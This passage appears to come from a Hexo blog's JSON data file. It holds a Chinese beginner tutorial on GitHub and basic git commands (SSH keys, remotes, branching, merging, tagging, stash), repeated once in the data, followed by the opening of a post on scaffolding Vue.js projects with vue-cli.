class=\"comment\"># 一般都是推到开发分支，再由leader推到master</span></span><br><span class=\"line\">$ git push origin master</span><br></pre></td></tr></table></figure>\n<p>可以把 master 换成你想要推送的任何分支。 </p>\n</li>\n<li><p>如果你还没有克隆现有仓库，并欲将你的仓库连接到某个远程服务器，你可以使用如下命令添加：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git remote add origin &lt;server&gt;</span><br></pre></td></tr></table></figure>\n<p>如此你就能够将你的改动推送到所添加的服务器上去了。</p>\n</li>\n</ul>\n</li>\n<li><p><code>分支：</code></p>\n<ul>\n<li><p>分支是用来将特性开发绝缘开来的。在你创建仓库的时候，master 是”默认的”分支。在其他分支上进行开发，完成后再将它们合并到主分支上。</p>\n</li>\n<li><p>创建一个叫做”feature_x”的分支，并切换过去：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git checkout -b feature_x</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>切换回主分支：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git checkout master</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>再把新建的分支删掉：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git branch -d feature_x</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>除非你将分支推送到远端仓库，不然该分支就是不为他人所见的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git push origin &lt;branch&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n<li><p><code>更新与合并：</code></p>\n<ul>\n<li><p>要更新你的本地仓库至最新改动，执行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git pull</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>以在你的工作目录中 <code>获取（fetch）</code> 并 <code>合并（merge）</code> 远端的改动。</p>\n</li>\n<li><p>要合并其他分支到你的当前分支（例如 master），执行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git merge &lt;branch&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在这两种情况下，git 都会尝试去自动合并改动。遗憾的是，这可能并非每次都成功，并可能出现冲突（conflicts）。 这时候就需要你修改这些文件来手动合并这些冲突（conflicts）。改完之后，你需要执行如下命令以将它们标记为合并成功：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git add &lt;filename&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在合并改动之前，你可以使用如下命令预览差异：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git diff &lt;source_branch&gt; &lt;target_branch&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n<li><p><code>标签：</code></p>\n<ul>\n<li><p>为软件发布创建标签是推荐的。这个概念早已存在，在 <code>SVN</code> 中也有。你可以执行如下命令创建一个叫做 <code>1.0.0</code> 的标签：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git tag 1.0.0 1b2e1d63ff</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>1b2e1d63ff</code> 是你想要标记的提交 <code>ID</code> 的前 <code>10</code> 位字符。可以使用下列命令获取提交 <code>ID</code>：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git <span class=\"built_in\">log</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>你也可以使用少一点的提交 ID 前几位，只要它的指向具有唯一性。</p>\n</li>\n</ul>\n</li>\n<li><p><code>替换本地改动：</code></p>\n<ul>\n<li><p>假如你操作失误（当然，这最好永远不要发生），你可以使用如下命令替换掉本地改动：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git checkout -- &lt;filename&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>此命令会使用 HEAD 中的最新内容替换掉你的工作目录中的文件。已添加到暂存区的改动以及新文件都不会受到影响。</p>\n</li>\n<li>假如你想丢弃你在本地的所有改动与提交，可以到服务器上获取最新的版本历史，并将你本地主分支指向它：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git fetch origin</span><br><span class=\"line\">$ git reset --hard origin/master</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n<li><p><code>实用小贴士：</code></p>\n<ul>\n<li><p>内建的图形化 <code>git</code>：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ gitk</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>彩色的 <code>git</code> 输出：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git config color.ui <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>显示历史记录时，每个提交的信息只显示一行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git config format.pretty oneline</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>交互式添加文件到暂存区：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git add -i</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>设置 <code>git</code> 命令别名：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git config --global alias.st status     <span class=\"comment\"># 把status 别名设置为 st</span></span><br><span class=\"line\">$ git config --global alias.cm commit     <span class=\"comment\"># 把commit 别名设置为 cm</span></span><br><span class=\"line\">$ git config --global alias.br branch     <span class=\"comment\"># 把branch 别名设置为 br</span></span><br><span class=\"line\">$ git config --global alias.co checkout   <span class=\"comment\"># 把checkout 别名设置为 co</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>git show</code> 命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git show commitId           <span class=\"comment\"># 查看这次提交具体修改的内容</span></span><br><span class=\"line\">$ git show stashId            <span class=\"comment\"># 查看stash的一些基本信息</span></span><br><span class=\"line\">$ git show commitId fileName  <span class=\"comment\"># 查看某一个文件在某一次提交中的修改</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>git stash</code> 命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git stash                   <span class=\"comment\"># 隐藏当前正在进行的工作</span></span><br><span class=\"line\">$ git stash list              <span class=\"comment\"># 列出所有stash</span></span><br><span class=\"line\">$ git stash apply stashId     <span class=\"comment\"># 拉取某次的stash</span></span><br><span class=\"line\">$ git stash drop stashId      <span class=\"comment\"># 移除某个stash</span></span><br><span class=\"line\">$ git stash pop               <span class=\"comment\">#  抽取上一次的stash到工作空间</span></span><br><span class=\"line\">$ git stash clear             <span class=\"comment\"># 清除所有的stash</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>把本地代码推送到远程仓库：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 1、初始化版本库</span></span><br><span class=\"line\">$ git init</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 添加文件到版本库（只是添加到缓存区），.代表添加文件夹下所有文件 </span></span><br><span class=\"line\">$ git add .</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 把添加的文件提交到版本库，并填写提交备注</span></span><br><span class=\"line\">$ git commit -m <span class=\"string\">\"first commit\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 2、到目前为止，我们完成了代码库的初始化，但代码是在本地，还没有提交到远程服务器，所以关键的来了，</span></span><br><span class=\"line\"><span class=\"comment\"># 要提交到就远程代码服务器，进行以下两步：</span></span><br><span class=\"line\">$ git remote add origin `remote repository`  <span class=\"comment\"># 把本地库与远程库关联</span></span><br><span class=\"line\"></span><br><span class=\"line\">$ git push -u origin master                  <span class=\"comment\"># 第一次推送时</span></span><br><span class=\"line\"></span><br><span class=\"line\">$ git push origin master                     <span class=\"comment\"># 第一次推送后，直接使用该命令即可推送修改</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ol>\n<p style=\"text-align: right\"><code>参考文档</code> <a href=\"https://git-scm.com/book/zh/v2\" target=\"_blank\" rel=\"noopener\">git-scm</a></p>","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><p>github是一个基于git的代码托管平台，付费用户可以建私人仓库，我们一般的免费用户只能使用公共仓库，也就是代码要公开。</p>\n</li>\n<li><p>github由Chris Wanstrath, PJ Hyett 与Tom Preston-Werner三位开发者在2008年4月创办。迄今拥有59名全职员工，主要提供基于git的<code>版本托管</code>服务。</p>\n</li>\n</ul>\n<h4 id=\"1、注册账号和创建仓库\"><a href=\"#1、注册账号和创建仓库\" class=\"headerlink\" title=\"1、注册账号和创建仓库\"></a><a>1、注册账号和创建仓库</a></h4><ol>\n<li><p>要想使用github第一步当然是注册github账号了， github官网地址：<a href=\"https://github.com/\" target=\"_blank\" rel=\"noopener\">https://github.com/</a>。 之后就可以创建仓库了（免费用户只能建公共仓库），点击右上角头像，再点击 <code>Your profile</code>，进入<code>Repository</code>，点击<code>New</code>，之后会出现一些仓库的配置信息：<br><img src=\"/images/github1.png\"></p>\n</li>\n<li><p>之后会进入配置界面，依次填写仓库的基本信息，然后点击<code>Creat Repository</code>，正式创建一个代码仓库：<br><img src=\"/images/github2.png\"></p>\n</li>\n<li><p>配置完成之后，会进入到仓库里面，让我们一探究竟吧：<br><img src=\"/images/github3.png\"></p>\n</li>\n</ol>\n<blockquote>\n<p>基本创建工作完成，后面就是用ssh链接到我们的仓库啦，这时我们就会用到 <code>git-bash</code> 这个工具啦，继续往下看。</p>\n</blockquote>\n<h4 id=\"2、git\"><a href=\"#2、git\" class=\"headerlink\" title=\"2、git\"></a><a>2、git</a></h4><blockquote>\n<p>下载安装 <code>Git</code>：</p>\n</blockquote>\n<ul>\n<li>下载 <a href=\"https://sourceforge.net/projects/git-osx-installer/files/git-2.16.2-intel-universal-mavericks.dmg/download?use_mirror=autoselect\" target=\"_blank\" rel=\"noopener\">git OSX</a> 版</li>\n<li>下载 <a href=\"https://git-scm.com/download/win\" target=\"_blank\" rel=\"noopener\">git Windows</a> 版</li>\n<li>下载 <a href=\"https://git-scm.com/download/linux\" target=\"_blank\" rel=\"noopener\">git Linux</a> 版</li>\n<li>或者可以进入 <a href=\"https://git-scm.com/downloads\" target=\"_blank\" rel=\"noopener\">GIT 官网</a> 下载适合自己的版本</li>\n</ul>\n<blockquote>\n<p>配置 <code>Git</code>：</p>\n</blockquote>\n<ol>\n<li><p>首先在本地创建 <code>ssh key</code> ，运行命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 这里填写你的邮箱地址</span></span><br><span class=\"line\">$ ssh-keygen -t rsa -C <span class=\"string\">\"your_email@youremail.com\"</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>后面的your_email@youremail.com改为你在github上注册的邮箱，之后会要求确认路径和输入密码，我们这使用默认的一路回车就行。成功的话会在~/下生成.ssh文件夹，进去，打开id_rsa.pub，复制里面的key。</p>\n</li>\n<li><p>回到github上，进入 Settings（账户配置），左边选择SSH and GPG keys，点击New SSH Key，title随便填，粘贴在你电脑上生成的key。<br><img src=\"/images/github4.png\"></p>\n</li>\n<li><p>为了验证是否成功，在git bash下输入：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ssh -T git@github.com</span><br></pre></td></tr></table></figure>\n<p>如果是第一次的会提示是否continue，输入yes就会看到：You’ve successfully authenticated, but GitHub does not provide shell access 。这就表示已成功连上github。</p>\n</li>\n<li><p>接下来我们要做的就是把本地仓库传到github上去，在此之前还需要设置username和email，因为github每次commit都会记录他们：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git config --global user.name <span class=\"string\">\"your name\"</span></span><br><span class=\"line\">$ git config --global user.email <span class=\"string\">\"your_email@youremail.com\"</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>进入要上传的仓库，右键git bash here，添加远程地址：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># git remote add origin git@github.com:yushengyuan1993/test.git</span></span><br><span class=\"line\">$ git remote add origin git@github.com:yourName/yourRepo.git</span><br></pre></td></tr></table></figure>\n<p>后面的yourName和yourRepo表示你再github的用户名和刚才新建的仓库，加完之后进入.git，打开config，这里会多出一个remote “origin”内容，这就是刚才添加的远程地址，也可以直接修改config来配置远程地址。</p>\n</li>\n<li><p>创建新文件夹，打开，然后执行 git init 以创建新的 git 仓库。</p>\n</li>\n</ol>\n<h4 id=\"3、克隆仓库\"><a href=\"#3、克隆仓库\" class=\"headerlink\" title=\"3、克隆仓库\"></a><a>3、克隆仓库</a></h4><ul>\n<li><p>执行如下命令以创建一个本地仓库的克隆版本：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git <span class=\"built_in\">clone</span> /path/to/repository</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>如果是远程服务器上的仓库，你的命令会是这个样子：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git <span class=\"built_in\">clone</span> username@host:/path/to/repository</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"4、Git命令\"><a href=\"#4、Git命令\" class=\"headerlink\" title=\"4、Git命令\"></a><a>4、Git命令</a></h4><blockquote>\n<p>你的本地仓库由 git 维护的三棵”树”组成。第一个是你的 工作目录，它持有实际文件；第二个是 暂存区（Index），它像个缓存区域，临时保存你的改动；最后是 HEAD，它指向你最后一次提交的结果。</p>\n</blockquote>\n<ol>\n<li><p><code>工作流：</code></p>\n<ul>\n<li><p>你可以提出更改（把它们添加到暂存区），使用如下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git add &lt;filename&gt;</span><br><span class=\"line\">git add *</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>这是 git 基本工作流程的第一步；使用如下命令以实际提交改动：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git commit -m <span class=\"string\">\"代码提交信息\"</span></span><br></pre></td></tr></table></figure>\n<p>现在，你的改动已经提交到了 HEAD，但是还没到你的远端仓库。</p>\n</li>\n</ul>\n</li>\n<li><p><code>推送改动：</code></p>\n<ul>\n<li><p>你的改动现在已经在本地仓库的 HEAD 中了。执行如下命令以将这些改动提交到远端仓库：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 推送改动到 master 分支，实际开发中很少会直接推送到master上，</span></span><br><span class=\"line\"><span class=\"comment\"># 一般都是推到开发分支，再由leader推到master</span></span><br><span class=\"line\">$ git push origin master</span><br></pre></td></tr></table></figure>\n<p>可以把 master 换成你想要推送的任何分支。 </p>\n</li>\n<li><p>如果你还没有克隆现有仓库，并欲将你的仓库连接到某个远程服务器，你可以使用如下命令添加：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git remote add origin &lt;server&gt;</span><br></pre></td></tr></table></figure>\n<p>如此你就能够将你的改动推送到所添加的服务器上去了。</p>\n</li>\n</ul>\n</li>\n<li><p><code>分支：</code></p>\n<ul>\n<li><p>分支是用来将特性开发绝缘开来的。在你创建仓库的时候，master 是”默认的”分支。在其他分支上进行开发，完成后再将它们合并到主分支上。</p>\n</li>\n<li><p>创建一个叫做”feature_x”的分支，并切换过去：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git checkout -b feature_x</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>切换回主分支：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git checkout master</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>再把新建的分支删掉：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git branch -d feature_x</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>除非你将分支推送到远端仓库，不然该分支就是不为他人所见的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git push origin &lt;branch&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n<li><p><code>更新与合并：</code></p>\n<ul>\n<li><p>要更新你的本地仓库至最新改动，执行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git pull</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>以在你的工作目录中 <code>获取（fetch）</code> 并 <code>合并（merge）</code> 远端的改动。</p>\n</li>\n<li><p>要合并其他分支到你的当前分支（例如 master），执行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git merge &lt;branch&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在这两种情况下，git 都会尝试去自动合并改动。遗憾的是，这可能并非每次都成功，并可能出现冲突（conflicts）。 这时候就需要你修改这些文件来手动合并这些冲突（conflicts）。改完之后，你需要执行如下命令以将它们标记为合并成功：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git add &lt;filename&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在合并改动之前，你可以使用如下命令预览差异：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git diff &lt;source_branch&gt; &lt;target_branch&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n<li><p><code>标签：</code></p>\n<ul>\n<li><p>为软件发布创建标签是推荐的。这个概念早已存在，在 <code>SVN</code> 中也有。你可以执行如下命令创建一个叫做 <code>1.0.0</code> 的标签：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git tag 1.0.0 1b2e1d63ff</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>1b2e1d63ff</code> 是你想要标记的提交 <code>ID</code> 的前 <code>10</code> 位字符。可以使用下列命令获取提交 <code>ID</code>：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git <span class=\"built_in\">log</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>你也可以使用少一点的提交 ID 前几位，只要它的指向具有唯一性。</p>\n</li>\n</ul>\n</li>\n<li><p><code>替换本地改动：</code></p>\n<ul>\n<li><p>假如你操作失误（当然，这最好永远不要发生），你可以使用如下命令替换掉本地改动：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git checkout -- &lt;filename&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>此命令会使用 HEAD 中的最新内容替换掉你的工作目录中的文件。已添加到暂存区的改动以及新文件都不会受到影响。</p>\n</li>\n<li>假如你想丢弃你在本地的所有改动与提交，可以到服务器上获取最新的版本历史，并将你本地主分支指向它：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git fetch origin</span><br><span class=\"line\">$ git reset --hard origin/master</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n<li><p><code>实用小贴士：</code></p>\n<ul>\n<li><p>内建的图形化 <code>git</code>：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ gitk</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>彩色的 <code>git</code> 输出：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git config color.ui <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>显示历史记录时，每个提交的信息只显示一行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git config format.pretty oneline</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>交互式添加文件到暂存区：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git add -i</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>设置 <code>git</code> 命令别名：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git config --global alias.st status     <span class=\"comment\"># 把status 别名设置为 st</span></span><br><span class=\"line\">$ git config --global alias.cm commit     <span class=\"comment\"># 把commit 别名设置为 cm</span></span><br><span class=\"line\">$ git config --global alias.br branch     <span class=\"comment\"># 把branch 别名设置为 br</span></span><br><span class=\"line\">$ git config --global alias.co checkout   <span class=\"comment\"># 把checkout 别名设置为 co</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>git show</code> 命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git show commitId           <span class=\"comment\"># 查看这次提交具体修改的内容</span></span><br><span class=\"line\">$ git show stashId            <span class=\"comment\"># 查看stash的一些基本信息</span></span><br><span class=\"line\">$ git show commitId fileName  <span class=\"comment\"># 查看某一个文件在某一次提交中的修改</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>git stash</code> 命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git stash                   <span class=\"comment\"># 隐藏当前正在进行的工作</span></span><br><span class=\"line\">$ git stash list              <span class=\"comment\"># 列出所有stash</span></span><br><span class=\"line\">$ git stash apply stashId     <span class=\"comment\"># 拉取某次的stash</span></span><br><span class=\"line\">$ git stash drop stashId      <span class=\"comment\"># 移除某个stash</span></span><br><span class=\"line\">$ git stash pop               <span class=\"comment\">#  抽取上一次的stash到工作空间</span></span><br><span class=\"line\">$ git stash clear             <span class=\"comment\"># 清除所有的stash</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>把本地代码推送到远程仓库：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 1、初始化版本库</span></span><br><span class=\"line\">$ git init</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 添加文件到版本库（只是添加到缓存区），.代表添加文件夹下所有文件 </span></span><br><span class=\"line\">$ git add .</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 把添加的文件提交到版本库，并填写提交备注</span></span><br><span class=\"line\">$ git commit -m <span class=\"string\">\"first commit\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 2、到目前为止，我们完成了代码库的初始化，但代码是在本地，还没有提交到远程服务器，所以关键的来了，</span></span><br><span class=\"line\"><span class=\"comment\"># 要提交到就远程代码服务器，进行以下两步：</span></span><br><span class=\"line\">$ git remote add origin `remote repository`  <span class=\"comment\"># 把本地库与远程库关联</span></span><br><span class=\"line\"></span><br><span class=\"line\">$ git push -u origin master                  <span class=\"comment\"># 第一次推送时</span></span><br><span class=\"line\"></span><br><span class=\"line\">$ git push origin master                     <span class=\"comment\"># 第一次推送后，直接使用该命令即可推送修改</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ol>\n<p style=\"text-align: right\"><code>参考文档</code> <a href=\"https://git-scm.com/book/zh/v2\" target=\"_blank\" rel=\"noopener\">git-scm</a></p>"},{"id":"0809009","title":"vue-cli 快速构建 vue.js 项目","date":"2018-01-02T06:59:28.000Z","_content":"- <a href=\"#Quickstart\">快速上手</a>\n- <a href=\"#Commands\">构建命令</a>\n- <a href=\"#Babel\">配置Babel</a>\n\n#### <a name=\"Quickstart\">1. 快速上手</a>\n本文介绍如何使用vue-cli快速构建vus.js项目，主要用到`webpack`，以及`vue-loader`，所以确保你的环境中安装有webpack。\n\n```bash\n# 安装vue-cli脚手架工具\n$ npm install -g vue-cli\n\n# 在 my-project 目录中生成一个项目\n# 这一步中你还可以选择是否安装vue-router,ESLint,unit tests, e2e tests...\n$ vue init webpack my-project\n\n# 进入到项目\n$ cd my-project\n\n# 安装依赖\n$ npm install\n\n# 构建并启动项目\n$ npm run dev\n```\n如果你在 `vue init webpack my-project` 步骤中选择安装所有的工具，那么我们的项目目录结构应该是这样的：\n```\n.\n├── build/                      # webpack config files\n│   └── ...\n├── config/\n│   ├── index.js                # main project config\n│   └── ...\n├── src/\n│   ├── main.js                 # app entry file\n│   ├── App.vue                 # main app component\n│   ├── components/             # ui components\n│   │   └── ...\n│   └── assets/                 # module assets (processed by webpack)\n│       └── ...\n├── static/                     # pure static assets (directly copied)\n├── test/\n│   └── unit/                   # unit tests\n│   │   ├── specs/              # test spec files\n│   │   ├── eslintrc            